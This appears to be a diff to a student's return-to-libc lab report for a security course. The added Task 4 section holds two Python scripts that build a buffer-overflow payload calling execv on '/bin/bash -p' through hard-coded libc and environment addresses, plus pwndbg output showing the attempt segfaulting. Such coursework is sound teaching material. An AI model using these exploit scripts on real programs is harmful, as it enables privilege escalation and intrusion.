@@ -1,5 +1,11 @@
 # HMWK4 Return-To-LibC Lab Report
 
+- [HMWK4 Return-To-LibC Lab Report](#hmwk4-return-to-libc-lab-report)
+  - [Env Setup](#env-setup)
+  - [Task 1: Finding out the Addresses of libc Functions](#task-1-finding-out-the-addresses-of-libc-functions)
+  - [Task 3: Launching the Attack](#task-3-launching-the-attack)
+  - [Task 4: Defeat Shell's Countermeasures](#task-4-defeat-shells-countermeasures)
+
 By Robert D. Hernandez (rherna70@uic.edu)
 
 ## Env Setup 
@@ -133,3 +139,150 @@ $
 
 ## Task 4: Defeat Shell's Countermeasures
 
+I attempted to build a return oriented attack defeating the countermeasures by using env vars for string address values.
+
+Unfortunately, while running the program I received segmentation faults.  I attempted to build my payload in both directions, and am unsure why execution did not create a shell as expected.
+
+
+Below you will find two versions of exploit.py used to build the exploit payload as well as the output from the latter version, of which both verions produced similar exceptions.  The difference between the two versions is the memory mapping of the content buffer, you'll see the four bytes of zero is placed on either side between the two versions.
+
+Verion 1
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+X = 48
+zero_addr = 0x00000000    # four bytes of zeros to terminate the string
+content[X:X+4] = (zero_addr).to_bytes(4,byteorder='little')
+
+X = 44
+dash_p_addr = 0xffffdfeb    # The address of "-p" in the ENV 
+content[X:X+4] = (dash_p_addr).to_bytes(4,byteorder='little')
+
+X = 40
+# X = 84
+bash_addr = 0xffffdfda   # The address of "/bin/bash" in the ENV 
+# sh_addr = 0xf7f3e0d5       # The address of "/bin/sh" in libc.so
+# sh_addr = 0xffffefe6     # The address of "/bin/sh" in the ENV 
+content[X:X+4] = (bash_addr).to_bytes(4,byteorder='little')
+X = 36
+content[X:X+4] = (bash_addr).to_bytes(4,byteorder='little')
+
+# Y = 76
+Y = 28
+# system_addr = 0xf7dc9170 # The address of system()
+execv_addr = 0xf7e5fa00 # The address of evecv()
+content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')
+
+Z = 32 
+# Z = 80
+exit_addr = 0xf7dbb460     # The address of exit()
+content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+  f.write(content)
+
+```
+
+
+Version 2
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+X = 48
+# X = 84
+bash_addr = 0xffffdfda   # The address of "/bin/bash" in the ENV 
+# sh_addr = 0xf7f3e0d5       # The address of "/bin/sh" in libc.so
+# sh_addr = 0xffffefe6     # The address of "/bin/sh" in the ENV 
+content[X:X+4] = (bash_addr).to_bytes(4,byteorder='little')
+X = 44
+content[X:X+4] = (bash_addr).to_bytes(4,byteorder='little')
+
+X = 40
+dash_p_addr = 0xffffdfeb    # The address of "-p" in the ENV 
+content[X:X+4] = (dash_p_addr).to_bytes(4,byteorder='little')
+
+X = 36
+zero_addr = 0x00000000    # four bytes of zeros to terminate the string
+content[X:X+4] = (zero_addr).to_bytes(4,byteorder='little')
+
+
+# Y = 76
+Y = 28
+# system_addr = 0xf7dc9170 # The address of system()
+execv_addr = 0xf7e5fa00 # The address of evecv()
+content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')
+
+Z = 32 
+# Z = 80
+exit_addr = 0xf7dbb460     # The address of exit()
+content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+  f.write(content)
+```
+
+```
+pwndbg> r
+Starting program: /home/rherna70/code/CS487/hw4/retlib 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Address of input[] inside main():  0xffffcc50
+Input size: 300
+Address of buffer[] inside bof():  0xffffcc20
+Frame Pointer value inside bof():  0xffffcc38
+Address of buffer[] inside bof():  0xffffcc1c
+Frame Pointer value inside bof():  0xffffcc34
+
+Program received signal SIGSEGV, Segmentation fault.
+__strcpy_ia32 () at ../sysdeps/i386/i586/strcpy.S:69
+69      ../sysdeps/i386/i586/strcpy.S: No such file or directory.
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────
+ EAX  0
+ EBX  0xfefefeff
+ ECX  1
+ EDX  0
+ EDI  0xffffcc1c —▸ 0x565561e9 (bof+12) ◂— add ebx, 0x2ddf
+ ESI  0xaaaaa6b2
+ EBP  0xffffcc34 ◂— 0xaaaaaaaa
+ ESP  0xffffcbfc —▸ 0x56558fc8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ed0
+ EIP  0xf7e363a0 (__strcpy_ia32+48) ◂— or al, byte ptr [esi]
+──────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────
+ ► 0xf7e363a0 <__strcpy_ia32+48>    or     al, byte ptr [esi]
+   0xf7e363a2 <__strcpy_ia32+50>    je     __strcpy_ia32+129           <__strcpy_ia32+129>
+ 
+   0xf7e363a4 <__strcpy_ia32+52>    stosb  byte ptr es:[edi], al
+   0xf7e363a5 <__strcpy_ia32+53>    xor    eax, eax                  EAX => 0
+   0xf7e363a7 <__strcpy_ia32+55>    inc    esi
+   0xf7e363a8 <__strcpy_ia32+56>    or     al, byte ptr [esi]
+   0xf7e363aa <__strcpy_ia32+58>    je     __strcpy_ia32+129           <__strcpy_ia32+129>
+ 
+   0xf7e363ac <__strcpy_ia32+60>    stosb  byte ptr es:[edi], al
+   0xf7e363ad <__strcpy_ia32+61>    xor    eax, eax                  EAX => 0
+   0xf7e363af <__strcpy_ia32+63>    inc    esi
+   0xf7e363b0 <__strcpy_ia32+64>    mov    ecx, dword ptr [esi]
+──────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────
+00:0000│ esp 0xffffcbfc —▸ 0x56558fc8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ed0
+01:0004│-034 0xffffcc00 —▸ 0xffffd114 —▸ 0xffffd2a0 ◂— '/home/rherna70/code/CS487/hw4/retlib'
+02:0008│-030 0xffffcc04 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0
+03:000c│-02c 0xffffcc08 —▸ 0x5655622f (bof+82) ◂— add esp, 0x10
+04:0010│-028 0xffffcc0c —▸ 0xffffcc1c —▸ 0x565561e9 (bof+12) ◂— add ebx, 0x2ddf
+05:0014│-024 0xffffcc10 ◂— 0xaaaaa6b2
+06:0018│-020 0xffffcc14 —▸ 0xffffcc50 ◂— 0xaaaaaaaa
+07:001c│-01c 0xffffcc18 —▸ 0x565561e9 (bof+12) ◂— add ebx, 0x2ddf
+────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────
+ ► 0 0xf7e363a0 __strcpy_ia32+48
+   1 0x5655622f bof+82
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> 
+```
